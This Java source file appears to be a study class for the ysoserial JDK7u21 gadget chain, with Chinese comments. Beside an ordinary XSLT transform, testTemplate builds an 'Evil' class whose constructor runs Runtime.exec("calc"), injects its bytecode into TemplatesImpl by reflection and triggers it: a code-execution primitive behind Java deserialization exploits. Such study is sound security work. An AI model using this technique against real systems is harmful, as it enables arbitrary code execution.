package com.r17a.ysoserial.jdk7u21;//package ms08067.jdk7u21;

import javax.xml.transform.*;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.lang.reflect.Field;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;


public class TestTmp {

    public static void main(String[] args) throws Exception {
        TestTmp testTmp = new TestTmp();
//        testTmp.testTemplate();
        testTmp.testTransform();

    }

    public void testTransform() throws TransformerException, FileNotFoundException {
        /*---- 1、使用TransformFactory界面的newInstance方法创建一个新的实例。-------------------*/
        // TransformFactory的缺省实现 是com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl类
        TransformerFactory oFactory = TransformerFactory.newInstance();

        /*---- 2、使用TransformFactory界面的newTemplates方法创建一个Templates界面的实现对象。-------------------*/
        //Templates的缺省实现 是org.apache.xalan.templates.StylesheetRoot
        Templates oTemplates = oFactory.newTemplates(
                //使用一个StreamSource对象来读取一个xsl文档
                new javax.xml.transform.stream.StreamSource("cdcatalog.xsl")
        );


        /*---- 3、使用Templates界面的newTransformer方法创建一个新的Transformer。 -------------------*/
        //Transformer的缺省实现 是com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
        Transformer transformer = oTemplates.newTransformer();

        /*---- 4、使用Transformer进行转换。  -------------------*/
        transformer.transform(
                //创建一个StreamSource对象来读取atom.xml
                new javax.xml.transform.stream.StreamSource("cdcatalog.xml"),
                //使用out作为输出writer创建一个StreamResult输出转换结果。
                new javax.xml.transform.stream.StreamResult(new FileOutputStream("E:\\1.html")));
    }

    //通过反射为obj的属性赋值
    private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public void testTemplate() throws Exception {
        ClassPool pool = ClassPool.getDefault();//ClassPool对象是一个表示class文件的CtClass对象的容器
        CtClass cc = pool.makeClass("Evil");//创建Evil类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//设置Evil类的父类为AbstractTranslet
        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//创建无参构造函数
        cons.setBody("{ Runtime.getRuntime().exec(\"calc\"); }");//设置无参构造函数体
        cc.addConstructor(cons);
        byte[] byteCode = cc.toBytecode();//toBytecode得到Evil类的字节码
        byte[][] targetByteCode = new byte[][]{byteCode};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCode);
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_name", "xx");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        templates.newTransformer();
//        templates.getTransletIndex();
//        templates.getOutputProperties();
    }
}
